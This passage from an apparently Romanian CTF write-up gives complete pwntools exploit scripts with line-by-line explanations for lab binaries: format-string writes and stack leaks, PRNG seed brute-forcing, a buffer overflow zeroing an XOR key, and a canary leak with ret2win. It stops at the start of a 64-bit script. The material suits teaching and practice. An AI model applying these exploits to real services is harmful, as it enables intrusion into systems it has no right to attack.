+Binar 32-bit, No canary, No PIE. Exista o adresa HOOK_ADDR care contine un
+pointer catre o functie apelata mai tarziu de program (similar unui GOT
+entry custom). Programul citeste si trimite direct la printf() un payload
+controlat de noi - format string vulnerabil cu SCRIERE, nu doar citire.
+Folosim tehnica "%hn in 2 pasi", care scrie cate 2 octeti o data (rezolva
+problema ca printf nu poate "scrie inapoi"/sa micsoreze numarul de caractere
+deja afisate, asa ca trebuie sa calculam valorile relativ, nu absolut).
+
+--- Cod final (runner.py) ---
+from pwn import *
+import struct
+
+context.log_level = 'info'
+context.arch = 'i386'
+
+HOST = "10.213.0.102"
+PORT = 59260
+LOCAL = False # True ## testat cu un fisier flag.txt local
+
+HOOK_ADDR = 0x0804c024
+WIN_ADDR  = 0x080491b6
+POZ = 4
+
+addr_jos = HOOK_ADDR        # aici scriem jumatatea de JOS a lui WIN_ADDR
+addr_sus = HOOK_ADDR + 2    # aici scriem jumatatea de SUS
+
+val_jos = WIN_ADDR & 0xffff          # 0x91b6 = 37302
+val_sus = (WIN_ADDR >> 16) & 0xffff  # 0x0804 = 2052
+
+pad1 = val_sus - 8
+pad2 = (val_jos - val_sus) % 65536
+
+payload  = struct.pack("<I", addr_sus)
+payload += struct.pack("<I", addr_jos)
+payload += f"%{pad1}c%{POZ}$hn".encode()
+payload += f"%{pad2}c%{POZ+1}$hn".encode()
+
+log.info(f"payload: {payload!r} ({len(payload)} octeti)")
+
+p = process('./runner') if LOCAL else remote(HOST, PORT)
+p.recvuntil(b"payload:")
+p.sendline(payload)
+p.interactive()
+
+--- Explicație linie cu linie ---
+HOOK_ADDR = 0x0804c024
+  Adresa unde e stocat pointerul catre functia apelata mai tarziu de
+  program (echivalentul unui GOT/hook custom din acest binar).
+
+WIN_ADDR = 0x080491b6
+  Adresa lui win() - vrem sa suprascriem valoarea de la HOOK_ADDR exact cu
+  aceasta adresa, astfel ca la urmatorul apel prin pointer, programul sa
+  sara de fapt in win().
+
+addr_jos = HOOK_ADDR ; addr_sus = HOOK_ADDR + 2
+  Fiindca scriem cu %hn, care scrie doar 2 octeti (un "half-word"/16 biti)
+  o data, trebuie sa spargem adresa tinta de 4 octeti in DOUA jumatati de
+  2 octeti fiecare, si sa scriem fiecare jumatate la adresa ei exacta:
+  jumatatea joasa a adresei WIN_ADDR se scrie la HOOK_ADDR (primii 2 octeti),
+  jumatatea de sus se scrie la HOOK_ADDR+2 (urmatorii 2 octeti).
+
+val_jos = WIN_ADDR & 0xffff ; val_sus = (WIN_ADDR >> 16) & 0xffff
+  Extrage efectiv cele doua jumatati de 16 biti din adresa WIN_ADDR:
+  val_jos = cei mai put semnificativi 16 biti (0x91b6), val_sus = urmatorii
+  16 biti (0x0804).
+
+pad1 = val_sus - 8
+  printf scrie caractere SECVENTIAL si %n (respectiv %hn) retine CATE
+  caractere au fost deja scrise de la inceputul apelului, nu poate "sari
+  inapoi". Strategia standard e sa scriem mai intai valoarea MAI MICA
+  dintre cele doua (aici val_sus, care e 0x0804=2052, mai mica decat
+  0x91b6=37302), ca sa nu trebuie niciodata sa "micsoram" numarul total de
+  caractere scrise. "- 8" scade cei 8 octeti deja scrisi de cele doua
+  adrese de la inceputul payload-ului (struct.pack de 4+4 octeti), care
+  CONTEAZA automat ca si caractere "afisate" de catre %c, inainte sa
+  ajungem la specificatorii %c propriu-zisi.
+
+pad2 = (val_jos - val_sus) % 65536
+  Dupa ce am scris deja val_sus caractere (prin padding %c), avem nevoie sa
+  mai scriem DOAR diferenta pana la val_jos (a doua valoare, mai mare), ca
+  sa atingem numarul total corect inainte de al doilea %hn. Modulo 65536
+  (2^16) e necesar fiindca %hn scrie contorul MODULO 65536 - daca val_jos
+  ar fi fost mai mic decat val_sus, diferenta negativa "se roteste" corect
+  prin acest modulo.
+
+payload  = struct.pack("<I", addr_sus)
+payload += struct.pack("<I", addr_jos)
+  Primii 8 octeti ai payload-ului sunt chiar cele doua adrese-tinta (addr_sus
+  si addr_jos), scrise CA DATE pe stiva/buffer. Acestea devin argumentele
+  pe care %4$hn si %5$hn le vor folosi ca adrese de scriere, fiindca
+  pozitiile 4 si 5 (POZ si POZ+1) din format string "cad" exact pe acesti
+  2 pointeri, numarand argumentele printf() de pe stiva.
+
+payload += f"%{pad1}c%{POZ}$hn".encode()
+  "%{pad1}c" tipareste pad1 caractere de umplutura (fara sa ne intereseze
+  CE tipareste, doar CATE caractere), aducand contorul intern al lui printf
+  exact la val_sus caractere scrise. "%{POZ}$hn" scrie acel contor (ca
+  16 biti) la adresa citita din argumentul de pe pozitia POZ=4, care este
+  addr_sus - deci scrie val_sus la HOOK_ADDR+2.
+
+payload += f"%{pad2}c%{POZ+1}$hn".encode()
+  Continua sa tipareasca inca pad2 caractere (contorul total acum atinge
+  val_jos, modulo 65536), apoi "%5$hn" scrie acest nou contor la adresa de
+  pe pozitia 5, care este addr_jos - scrie val_jos la HOOK_ADDR. Rezultatul
+  net: HOOK_ADDR = val_jos (jos), HOOK_ADDR+2 = val_sus (sus) => cele 4
+  octeti de la HOOK_ADDR formeaza exact WIN_ADDR in little-endian.
+
+p.recvuntil(b"payload:"); p.sendline(payload)
+  Asteapta promptul si trimite payload-ul format-string construit.
+
+p.interactive()
+  La urmatorul apel prin pointer-ul de la HOOK_ADDR, programul sare de fapt
+  in win(), care tipareste flagul.
+
+
+===============================================================================
+10. barbut — BRUTEFORCE PRNG (srand/rand din libc)
+===============================================================================
+--- Context ---
+Jocul de barbut cere jucatorului un "seed" pentru generatorul de numere
+aleatoare, pe care il foloseste intern cu srand(seed) + rand() % 60 pentru
+a calcula ruloul jucatorului. Nu exista nicio vulnerabilitate de memorie:
+PRNG-ul e cel REAL din libc (glibc), deci putem reproduce exact aceeasi
+secventa local, cautand un seed care garanteaza intotdeauna ruloul maxim
+posibil (60), si il trimitem de suficiente ori cat sa castigam >=25 din 27
+runde necesare.
+
+--- Cod final (barbut.py) ---
+from pwn import *
+import ctypes
+
+context.log_level = 'info'
+
+HOST = "10.213.0.102"
+PORT = 49929
+
+libc = ctypes.CDLL("libc.so.6")
+
+
+def gaseste_seed_pentru_roll_maxim():
+    for seed in range(1, 200000):
+        libc.srand(seed)
+        r = libc.rand()
+        if r % 60 == 59:          # => roll = 59 + 1 = 60, maximul posibil
+            return seed
+    raise Exception("nu am gasit un seed bun, mareste intervalul de cautare")
+
+
+SEED_MAGIC = gaseste_seed_pentru_roll_maxim()
+log.info(f"Seed gasit care da intotdeauna roll=60: {SEED_MAGIC}")
+
+p = remote(HOST, PORT)
+
+p.recvuntil(b"flag\n")
+
+NUM_RUNDE = 27
+castiguri = 0
+
+for runda in range(1, NUM_RUNDE + 1):
+    p.recvuntil(b"Choose your lucky number\n")
+    p.sendline(str(SEED_MAGIC).encode())
+
+    p.recvuntil(b"Ready?\n")
+    p.sendline(b"yes")
+
+    linie = p.recvline(timeout=3).decode(errors="replace")
+    log.info(f"[runda {runda:02d}] {linie.strip()!r}")
+
+    rezultat = p.recvline(timeout=3).decode(errors="replace").strip()
+    log.info(f"           rezultat: {rezultat!r}")
+    if "win" in rezultat:
+        castiguri += 1
+
+log.info(f"Castiguri totale: {castiguri} / {NUM_RUNDE} (avem nevoie de >= 25)")
+
+final = p.recvall(timeout=5).decode(errors="replace")
+print(final)
+
+--- Explicație linie cu linie ---
+libc = ctypes.CDLL("libc.so.6")
+  Incarca libc-ul REAL al sistemului (aceeasi biblioteca pe care o foloseste
+  si binarul jocului) in procesul Python, prin ctypes, ca sa putem apela
+  DIRECT functiile srand()/rand() din C si sa obtinem EXACT aceleasi
+  rezultate pe care le-ar obtine binarul, pentru acelasi seed.
+
+def gaseste_seed_pentru_roll_maxim(): for seed in range(1, 200000): ...
+  Cauta local (fara sa ne conectam la server) un seed pentru care, imediat
+  dupa srand(seed), primul rand() % 60 == 59. Programul calculeaza probabil
+  roll = rand() % 60 + 1, deci rezultatul 59 corespunde la roll = 60, cea
+  mai mare valoare posibila - garantandu-ne practic victoria la fiecare
+  runda (CPU-ul nu poate obtine un rulou mai mare).
+
+SEED_MAGIC = gaseste_seed_pentru_roll_maxim()
+  Ruleaza cautarea o singura data, inainte de a ne conecta - seed-ul gasit
+  e valabil pentru TOATE rundele, fiindca fiecare runda reseteaza PRNG-ul
+  cu srand(seed) la fel.
+
+p.recvuntil(b"flag\n")
+  Trece de mesajul introductiv al jocului.
+
+NUM_RUNDE = 27
+  Jucam mai multe runde decat minimul necesar (25), ca marja de siguranta
+  in caz ca vreo runda nu se potriveste perfect din motive de parsing.
+
+for runda in range(...): p.sendline(str(SEED_MAGIC).encode()) ; p.sendline(b"yes")
+  La fiecare runda: trimite seed-ul gasit (jocul il foloseste cu srand()
+  intern, exact ca la noi local), apoi confirma "yes" la promptul "Ready?".
+
+linie = p.recvline(...) ; rezultat = p.recvline(...).strip()
+  Citeste doua linii de raspuns: prima cu scorurile CPU/jucator (ambele
+  trebuie sa coincida cu ce am calculat local - 60 pentru jucator), a doua
+  cu rezultatul rundei ("You win this round" / "You lose").
+
+if "win" in rezultat: castiguri += 1
+  Contorizeaza victoriile, doar pentru verificare/logging - jocul insusi
+  decide cand am atins pragul de 25 victorii.
+
+final = p.recvall(timeout=5); print(final)
+  Dupa cele 27 de runde, citeste tot ce ramane de trimis de server -
+  acolo apare flagul, odata ce pragul de victorii a fost atins.
+
+
+===============================================================================
+11. better_format — FORMAT STRING: LEAK (CITIRE) DE PE STIVĂ
+===============================================================================
+--- Context ---
+Binar 32-bit, No canary. Programul citeste un string de la noi si il
+trimite DIRECT la printf(buf) (fara "%s"), permitand format string arbitrar.
+Pe stiva, langa bufferul nostru, se afla un AL DOILEA buffer separat
+(flag_buf) in care fusese citit anterior continutul flag.txt cu fgets().
+Scanam pozitiile de argument ale lui printf cu %n$x pana gasim un interval
+NEINTRERUPT de octeti printabili - acela e flagul.
+
+--- Cod final (better_format_leak_format.py) ---
+from pwn import *
+import struct
+
+HOST = "10.213.0.102"
+PORT = 59387   # actualizeaza portul la tine
+
+POZITII = list(range(6, 17))
+
+p = remote(HOST, PORT)
+p.recvuntil(b"> ")
+
+payload = " ".join(f"%{n}$x" for n in POZITII)
+p.sendline(payload.encode())
+
+raspuns = p.recvline(timeout=3).decode(errors="replace").strip()
+print(f"[*] Raspuns brut: {raspuns}")
+
+valori = raspuns.split()
+
+
+def e_printabil(bucata):
+    return all(0x20 <= b <= 0x7e for b in bucata)
+
+
+bucati = []
+for n, v in zip(POZITII, valori):
+    v = v.strip()
+    try:
+        numar = int(v, 16)
+    except ValueError:
+        print(f"[!] Pozitia {n}: valoare neasteptata '{v}', opresc aici")
+        break
+    bucata = struct.pack("<I", numar)
+    bucati.append((n, bucata))
+    print(f"    pozitia {n}: {v}  ->  {bucata!r}  {'(printabil)' if e_printabil(bucata) else ''}")
+
+cea_mai_buna = []
+curenta = []
+for n, bucata in bucati:
+    if e_printabil(bucata):
+        curenta.append(bucata)
+        if len(curenta) > len(cea_mai_buna):
+            cea_mai_buna = curenta[:]
+    else:
+        curenta = []
+
+flag_bytes = b"".join(cea_mai_buna)
+
+print(f"\n[+] FLAG RECONSTRUIT: {flag_bytes.decode(errors='replace')}")
+
+p.close()
+
+--- Explicație linie cu linie ---
+POZITII = list(range(6, 17))
+  Pozitiile de argument ale lui printf (pentru %n$x) unde, prin scanare
+  manuala prealabila (cu un script separat ce testa pozitiile 1-50), s-a
+  observat ca apar octeti cu valori printabile (probabil fragmente din
+  flag_buf de pe stiva).
+
+payload = " ".join(f"%{n}$x" for n in POZITII)
+  Construieste UN SINGUR payload care cere, intr-o singura trimitere, toate
+  valorile de pe pozitiile 6...16, ca sa nu facem 11 conexiuni separate
+  (mai rapid si mai putin predispus la variatii intre rulari, desi stiva nu
+  are PIE/ASLR relevant aici pentru pozitiile cu flag).
+
+p.sendline(payload.encode())
+  Trimite payload-ul; fiindca printf(buf_nostru) e apelat FARA "%s", toate
+  specificatorii %n$x sunt interpretati normal de printf, citind valori de
+  pe stiva de la pozitiile cerute (nu doar primul argument, ca intr-un
+  apel normal - aici "argumentele" sunt de fapt octeti random/structuri
+  de pe stiva, fiindca printf nu are atatea argumente reale).
+
+raspuns = p.recvline(...); valori = raspuns.split()
+  Citeste linia cu toate valorile hex, separate prin spatiu (asa cum am
+  construit payload-ul), si le imparte intr-o lista de string-uri hex.
+
+def e_printabil(bucata): return all(0x20 <= b <= 0x7e for b in bucata)
+  Verifica daca toti cei 4 octeti dintr-o bucata sunt in intervalul ASCII
+  printabil (spatiu .. tilde) - criteriu simplu pentru "aceasta bucata e
+  probabil text, nu o adresa/gunoi de pe stiva".
+
+for n, v in zip(POZITII, valori): numar = int(v, 16); bucata = struct.pack("<I", numar)
+  Pentru fiecare pozitie si valoarea ei hex corespunzatoare: converteste
+  valoarea hex la un numar intreg, apoi o impacheteaza INAPOI pe 4 octeti
+  little-endian - asta reconstruieste octetii EXACT asa cum stateau in
+  memorie (printf("%x") afiseaza numarul in big-endian "logic", dar in
+  memorie pe x86 octetii sunt little-endian, deci trebuie impachetati din
+  nou ca sa recuperam ordinea corecta a caracterelor din flag).
+
+cea_mai_buna = []; curenta = []; for n, bucata in bucati: if e_printabil(bucata): ...
+  Parcurge bucatile in ordine si tine evidenta celei mai LUNGI secvente
+  NEINTRERUPTE de bucati printabile consecutive. Aceasta abordare elimina
+  automat "gunoiul" (adrese, pointeri) de la inceputul si finalul
+  intervalului scanat, fara sa presupunem manual unde incepe/se termina
+  flagul exact.
+
+flag_bytes = b"".join(cea_mai_buna)
+  Concateneaza bucatile din cea mai lunga secventa gasita, reconstruind
+  flagul complet, octet cu octet, in ordinea corecta.
+
+
+===============================================================================
+12. casino — FORMAT STRING: SCRIERE (%n) PESTE O VARIABILĂ DE SCOR
+===============================================================================
+--- Context ---
+Binar 32-bit, No canary. Functia give_hint() face printf(hint) cu hint-ul
+nostru, fara "%s" - AL DOILEA format string vulnerabil din arhiva. Scorul
+jucatorului e o variabila globala aflata la o distanta FIXA fata de
+bufferul "hint" (buffer_addr - 0x64). Strategia: leak adresa bufferului cu
+%8$x, calculam adresa scorului, apoi facem o scriere %n care seteaza
+EXACT 200 (scorul de victorie) la acea adresa.
+
+--- Cod final (exploit_casino.py) ---
+from pwn import *
+import struct
+
+context.log_level = 'debug'
+
+HOST = "10.213.0.102"
+PORT = 48901   # actualizeaza daca se schimba
+
+LOCAL = False   # True = testeaza local (./casino), False = conectare remote
+
+if LOCAL:
+    p = process(['stdbuf', '-o0', './casino'])
+else:
+    p = remote(HOST, PORT)
+
+banner = p.recvuntil(b"hint:", timeout=5)
+log.info(f"Banner complet primit: {banner!r}")
+
+p.sendline(b"%8$x")  # cerem adresa bufferului
+
+raw_pana_la_pentru = p.recvuntil(b"pentru:\n", timeout=5)
+log.info(f"Text pana la 'pentru:\\n': {raw_pana_la_pentru!r}")
+raw = p.recvuntil(b"Introdu", timeout=5)
+log.info(f"Text brut dupa 'pentru:\\n' (contine valoarea hex + ce vine dupa): {raw!r}")
+hex_str = raw[:-len(b"Introdu")].strip().decode(errors="replace")
+log.info(f"Text brut primit pentru valoarea hex: {hex_str!r}")
+buffer_addr = int(hex_str, 16)
+score_addr = buffer_addr - 0x64
+
+log.info(f"Adresa buffer: {hex(buffer_addr)}")
+log.info(f"Adresa scor calculata: {hex(score_addr)}")
+
+score_bytes = struct.pack("<I", score_addr)
+log.info(f"Octetii adresei scorului: {score_bytes!r}")
+
+TARGET = 200
+padding = TARGET - 4
+
+payload = score_bytes + f"%41${padding}x%40$n".encode()
+log.info(f"Payload total: {payload!r} ({len(payload)} octeti)")
+
+p.sendline(payload)
+
+raspuns2 = p.recv(timeout=3)
+log.info(f"Raspuns dupa scriere (primii/ultimii 80 octeti): {raspuns2[:80]!r} ... {raspuns2[-80:]!r}")
+
+p.sendline(b"1")
+rezultat_final = p.recvall(timeout=5)
+print(rezultat_final.decode(errors="replace"))
+
+--- Explicație linie cu linie ---
+p = process(['stdbuf', '-o0', './casino']) / remote(HOST, PORT)
+  "stdbuf -o0" forteaza buffer-ul stdout al procesului local sa fie
+  unbuffered (necesar pentru testare locala, ca sa primim imediat output-ul
+  fara sa asteptam flush-ul implicit al libc); pentru remote, doar
+  deschidem conexiunea normal.
+
+banner = p.recvuntil(b"hint:", timeout=5)
+  Citeste tot mesajul initial, pana la promptul care cere hint-ul.
+
+p.sendline(b"%8$x")
+  Trimite format string-ul "%8$x" ca "propozitie pentru hint" - acesta e
+  trimis DIRECT la printf() in give_hint(), fara "%s", deci e interpretat ca
+  specificator de format: cere valoarea argumentului de pe pozitia 8 de pe
+  stiva, in hexazecimal. Prin experimentare (gdb: print/x $ebp la breakpoint
+  in give_hint), pozitia 8 corespunde adresei bufferului local in care a
+  fost copiat hint-ul nostru - practic ne leakeaza propriul buffer, deci
+  stim adresa lui EXACTA (fara sa ghicim din ASLR, fiindca binarul nu are
+  PIE si stiva nu-i afecteaza relatia relativa).
+
+raw_pana_la_pentru = p.recvuntil(b"pentru:\n", ...)
+raw = p.recvuntil(b"Introdu", ...)
+hex_str = raw[:-len(b"Introdu")].strip().decode(...)
+  Mesajul serverului e "Nu avem hinturi pentru:\n<valoare_hex>Introdu...",
+  fara spatii/newline-uri clare intre valoare si urmatorul prompt. Se
+  citeste in doua etape: mai intai pana la "pentru:\n", apoi tot ce vine
+  INAINTE de "Introdu" (urmatorul prompt), iar din acel fragment se scoate
+  sufixul "Introdu" ca sa ramana doar valoarea hex curata.
+
+buffer_addr = int(hex_str, 16); score_addr = buffer_addr - 0x64
+  Converteste valoarea hex leakata (adresa bufferului de hint) la intreg,
+  apoi scade 0x64 (100 zecimal) - distanta FIXA, gasita prin analiza
+  disasamblarii/gdb, intre bufferul de hint si variabila globala "scor" pe
+  stiva/memorie. Acesta e calculul central al exploit-ului: nu stim scorul
+  direct, dar stim UNDE e relativ la ceva ce putem leak-a.
+
+score_bytes = struct.pack("<I", score_addr)
+  Impacheteaza adresa calculata pe 4 octeti little-endian - aceasta va fi
+  scrisa la INCEPUTUL payload-ului, ca sa serveasca drept adresa-tinta
+  pentru %n (exact ca la runner, dar aici cu %n pe 4 octeti intregi, nu %hn).
+
+TARGET = 200; padding = TARGET - 4
+  Scorul tinta e 200 (valoarea care, conform codului binarului, declanseaza
+  "Player win"). Scazand 4 (lungimea celor 4 octeti ai adresei deja scrisi
+  la inceputul payload-ului, care conteaza ca "deja afisati" de printf),
+  obtinem cati octeti de umplutura %x mai trebuie tiparati ca numarul total
+  de caractere scrise sa ajunga EXACT la 200.
+
+payload = score_bytes + f"%41${padding}x%40$n".encode()
+  "%41$<padding>x": tipareste valoarea argumentului de pe pozitia 41 (nu ne
+  intereseaza ce valoare e, doar o folosim ca sa consumam "padding" caractere
+  prin latimea minima ceruta a campului - "%Nx" cu N mare forteaza printf sa
+  completeze cu spatii pana la N caractere). "%40$n": scrie numarul TOTAL de
+  caractere afisate PANA ACUM (4 din adresa + padding din %x) la adresa
+  citita de pe pozitia 40 - care, prin alinierea argumentelor pe stiva, este
+  chiar score_bytes-ul scris la inceputul payload-ului. Rezultatul: scorul
+  e setat la exact 200.
+
+p.sendline(payload)
+  Trimite payload-ul la promptul de hint, declansand scrierea %n descrisa
+  mai sus.
+
+p.sendline(b"1"); rezultat_final = p.recvall(...)
+  Dupa scriere, mai trimitem un "ghicit" oarecare (orice numar), ca sa
+  declansam verificarea scorului din program (care, vazand scor >= 200/100
+  conform conditiei "100 = Player win"), tipareste flagul.
+
+
+===============================================================================
+13. tamrof_dab — FORMAT STRING: LEAK DIRECT AL FLAGULUI DIN MEMORIE
+===============================================================================
+--- Context ---
+Binar 32-bit, No canary. Functia letsPlay() trimite direct la printf()
+textul nostru fara "%s" - al treilea format string al arhivei. Flagul a
+fost citit anterior in memorie (probabil in acelasi buffer sau unul vecin)
+si, scanand pozitiile cu %n$x, s-a gasit (prin gdb local) ca de la pozitia
+93 incolo apar, consecutiv, octeti ai flagului. Se citeste pozitie cu
+pozitie pana la caracterul "}" (sfarsitul flagului).
+
+--- Cod final (exploit_tamrof_dab.py) ---
+from pwn import *
+import struct
+
+context.log_level = 'error'
+
+HOST = "10.213.0.102"
+PORT = 53135
+
+
+START_POS = 93     # confirmat prin gdb local
+MAX_POS = 120       # cat de departe scanam (flag.txt poate avea pana la 0x46=70 octeti)
+
+
+def citeste_pozitie(n):
+    p = remote(HOST, PORT, timeout=5)
+    p.recvuntil(b"interesting: ")
+    p.sendline(f"%{n}$x".encode())
+    raspuns = p.recvline(timeout=3).decode(errors="replace").strip()
+    p.close()
+    try:
+        return struct.pack("<I", int(raspuns, 16))
+    except ValueError:
+        return None
+
+
+flag_bytes = b""
+
+bucata = citeste_pozitie(START_POS)
+log.info(f"pozitia {START_POS}: {bucata!r}")
+if bucata is not None:
+    flag_bytes += bucata[2:]   # pastram doar ultimii 2 octeti (restul e "gunoi" dinainte de flag)
+
+for n in range(START_POS + 1, MAX_POS):
+    bucata = citeste_pozitie(n)
+    if bucata is None:
+        log.info(f"pozitia {n}: raspuns neasteptat, opresc aici")
+        break
+    log.info(f"pozitia {n}: {bucata!r}")
+    flag_bytes += bucata
+    if b"}" in bucata:
+        break
+
+print(f"\n[+] FLAG RECONSTRUIT: {flag_bytes.decode(errors='replace')}")
+
+--- Explicație linie cu linie ---
+START_POS = 93 ; MAX_POS = 120
+  Pozitia de start (93) a fost gasita prin scanare prealabila in gdb local
+  (testand pozitii succesive pana s-au vazut primele octeti printabili).
+  MAX_POS e o limita superioara generoasa, calculata din marimea maxima
+  estimata a flagului (0x46 = 70 octeti).
+
+def citeste_pozitie(n): p = remote(...); p.sendline(f"%{n}$x"...); return struct.pack("<I", int(raspuns, 16))
+  Pentru fiecare pozitie n, deschide o conexiune NOUA (mai simplu si mai
+  robust decat sa reutilizam una singura, fiindca fiecare cerere e
+  independenta), trimite "%n$x" ca input la promptul "interesting:",
+  citeste raspunsul hex si il impacheteaza pe 4 octeti little-endian -
+  exact aceeasi tehnica de reconstructie ca la better_format.
+
+bucata = citeste_pozitie(START_POS); flag_bytes += bucata[2:]
+  Prima pozitie citita e un bloc "la granita" intre gunoi si flag real -
+  DOAR ultimii 2 octeti din cei 4 (bucata[2:], fiindca sunt little-endian,
+  cei mai "din spate" octeti corespund partii de START a flagului) sunt
+  flag valid; restul e zgomot de pe stiva de inainte de flag.
+
+for n in range(START_POS + 1, MAX_POS): bucata = citeste_pozitie(n); flag_bytes += bucata; if b"}" in bucata: break
+  Pentru restul pozitiilor, blocurile sunt "curate" (toti cei 4 octeti fac
+  parte din flag), asa ca le adaugam direct. Bucla se opreste imediat ce
+  gaseste caracterul "}" intr-o bucata, semn ca am ajuns la finalul
+  flagului (format CTF{...}), evitand sa citim octeti suplimentari inutili.
+
+print(f"\n[+] FLAG RECONSTRUIT: {flag_bytes.decode(errors='replace')}")
+  Afiseaza flagul complet, reconstruit octet cu octet din toate pozitiile
+  scanate.
+
+
+===============================================================================
+14. encryptor — BUFFER OVERFLOW CARE SUPRASCRIE CHEIA XOR (DECRIPTARE "GRATUITĂ")
+===============================================================================
+--- Context ---
+Binar 32-bit. encrypt_flag() citeste flagul (max 0x44=68 octeti) intr-un
+buffer local de pe stiva, apoi, caracter cu caracter, il XOR-eaza cu o
+cheie de 4 octeti primita ca argument (ebp+0x8), indexata ciclic cu
+"index & 3" (modulo 4), si tipareste rezultatul XOR-at in hexazecimal.
+Vulnerabilitate: cheia (argumentul functiei) e primita printr-un input
+nostru vulnerabil la overflow, deci putem suprascrie cheia cu patru
+octeti ZERO - iar "flag XOR 0 == flag" -> textul tiparit e de fapt flagul
+in clar, codificat doar in hexazecimal.
+
+--- Cod final (encryptor.py) ---
+from pwn import *
+
+context.log_level = 'info'
+context.arch = 'i386'
+
+HOST = "10.213.0.102"
+PORT = 45022
+LOCAL = False # True ## pt un fiser flag.txt local
+
+payload = b"A" * 32 + b"\x00\x00\x00\x00"   # 32 umplutura + cheia noua: toate zero
+
+p = process('./encryptor') if LOCAL else remote(HOST, PORT)
+p.recvuntil(b"end?")
+p.sendline(payload)
+
+output = p.recvall(timeout=5).decode(errors="replace")
+print(output)
+
+import re
+hexstr = re.search(r"flag\n([0-9a-f]+)", output)
+if hexstr:
+    flag_bytes = bytes.fromhex(hexstr.group(1))
+    print("FLAG:", flag_bytes)
+
+--- Explicație linie cu linie ---
+payload = b"A" * 32 + b"\x00\x00\x00\x00"
+  32 octeti de umplutura, care suprascriu bufferul local (ebp-0x54, folosit
+  pentru alte scopuri) pana sa ajungem exact la locul de pe stiva unde se
+  afla (sau unde e citita de o functie din apropiere) cheia XOR de 4 octeti
+  folosita la encrypt_flag(). Cei 4 octeti finali de "\x00" suprascriu
+  efectiv aceasta cheie, inlocuind-o cu toti bitii zero.
+
+p.recvuntil(b"end?"); p.sendline(payload)
+  Asteapta promptul programului care cere inputul vulnerabil, apoi trimite
+  payload-ul care provoaca overflow-ul controlat descris mai sus.
+
+output = p.recvall(timeout=5).decode(errors="replace")
+  Citeste tot ce mai trimite programul: acesta continua executia normal
+  (nu crapa, fiindca overflow-ul e mic si tintit), face XOR intre flag si
+  cheia (acum zero), si tipareste rezultatul XOR hexazecimal - care, fiind
+  XOR cu zero, e EXACT flagul in clar, doar in reprezentare hexa.
+
+hexstr = re.search(r"flag\n([0-9a-f]+)", output)
+  Cu o expresie regulata, extrage sirul hexazecimal care apare imediat
+  dupa cuvantul "flag" pe o linie noua in output-ul programului (acolo
+  tipareste efectiv valorile XOR-ate, caracter cu caracter, concatenate).
+
+flag_bytes = bytes.fromhex(hexstr.group(1))
+  Converteste sirul hexazecimal extras inapoi in octeti bruti - fiindca
+  cheia era zero, acesti octeti sunt exact caracterele ASCII ale flagului
+  original (CTF{...} / SI{...}), afisate direct cu print().
+
+
+===============================================================================
+15. migratory_bird_x32 — LEAK CANARY (FORMAT STRING) + BOF -> RET2WIN (32-bit)
+===============================================================================
+--- Context ---
+checksec: canary ACTIV. Programul are un format string vulnerabil la
+intrebarea "name" (permite leak de valori de pe stiva), si SEPARAT un
+buffer overflow clasic la intrebarea "joke". Canary-ul variaza la fiecare
+rulare (random), dar programul nu reseteaza stiva intre cele doua intrebari
+din aceeasi conexiune, asa ca putem leak-a canary-ul prin format string la
+"name" si apoi il punem la locul corect in payload-ul de overflow de la
+"joke" - canary-ul "trece" verificarea, iar adresa de retur e suprascrisa.
+
+--- Cod final (migratory_bird_x32_find_flag.py) ---
+from pwn import *
+
+HOST = "10.213.0.102"
+PORT = 45616
+
+SOUTH_AFRICA = 0x08049233
+
+p = remote(HOST, PORT)
+
+p.recvuntil(b"name: ")
+p.sendline(b"%15$x")
+
+raspuns = p.recvline().decode(errors="replace").strip()
+canary = int(raspuns, 16)
+print(f"[*] Canary gasit: {hex(canary)}")
+
+payload = b"A" * 32
+payload += p32(canary)
+payload += b"B" * 12
+payload += p32(SOUTH_AFRICA)
+
+p.recvuntil(b"joke: ")
+p.sendline(payload)
+
+raspuns_final = p.recvall(timeout=3)
+print(raspuns_final.decode(errors="replace"))
+
+--- Explicație linie cu linie ---
+SOUTH_AFRICA = 0x08049233
+  Adresa unei functii (gasita static, No PIE pe 32-bit) care tipareste
+  flagul - echivalentul lui "win()" in acest challenge, numita aici
+  "south_africa" dupa contextul/povestea challenge-ului.
+
+p.sendline(b"%15$x")
+  La promptul "name", trimitem un format string ("%15$x") care cere
+  valoarea argumentului de pe pozitia 15 - gasita prin scanare prealabila
+  ca fiind EXACT valoarea canary-ului de pe stiva in acel moment al
+  executiei (canary-ul e pus de compilator imediat dupa prologul functiei,
+  inainte de orice citire de input).
+
+canary = int(raspuns, 16)
+  Converteste valoarea hex primita la intreg - acesta e canary-ul REAL
+  pentru aceasta conexiune (variaza de la o rulare la alta).
+
+payload = b"A" * 32 + p32(canary) + b"B" * 12 + p32(SOUTH_AFRICA)
+  Structura exacta a overflow-ului de la "joke":
+    - 32 octeti "A": umplutura bufferului vulnerabil, pana EXACT la
+      locatia canary-ului pe stiva.
+    - p32(canary): scriem INAPOI aceeasi valoare de canary pe care am
+      leak-at-o - asta "pacaleste" verificarea canary-ului de la finalul
+      functiei (compilatorul verifica daca valoarea canary de pe stiva s-a
+      schimbat; daca o rescriem identic, verificarea trece).
+    - 12 octeti "B": umplutura pentru restul campurilor salvate de pe
+      stiva dupa canary (ex. saved ebx + saved ebp pe 32-bit cu alti
+      registri salvati), a caror valoare exacta nu conteaza.
+    - p32(SOUTH_AFRICA): adresa de retur reala, suprascrisa cu functia
+      care tipareste flagul.
+
+p.recvuntil(b"joke: "); p.sendline(payload)
+  Asteapta promptul "joke" si trimite overflow-ul; fiindca canary-ul
+  coincide, functia face "ret" normal (fara sa detecteze corupere), iar
+  "ret"-ul sare in SOUTH_AFRICA.
+
+raspuns_final = p.recvall(timeout=3); print(...)
+  Citeste si afiseaza tot ce trimite programul dupa salt - flagul.
+
+
+===============================================================================
+16. migratory_bird_x64 — LEAK CANARY (FORMAT STRING) + BOF -> RET2WIN (64-bit)
+===============================================================================
+--- Context ---
+Aceeasi idee ca la varianta x32, dar pe 64-bit, cu o complicatie reala:
+canary-ul pe 64-bit are 8 octeti, iar PRIMUL octet e INTOTDEAUNA 0x00 (asa
+e generat de glibc, ca sa impiedice leak-uri prin functii string ca
+printf("%s") sau puts() care s-ar opri la primul null byte). Problema e ca
+daca VREUN ALT octet al canary-ului (nu primul) e un octet de whitespace
+(spatiu, tab, newline etc.), scanf("%s") de la "joke" s-ar opri PREMATUR la
+acel octet cand incercam sa il retrimitem - de aceea scriptul reincearca
+automat conexiuni noi pana gaseste un canary "curat" (fara whitespace in
+octetii 2-8).
+
+--- Cod final (migratory_bird_x64_exploit_detaliat.py) ---
+from pwn import *
+
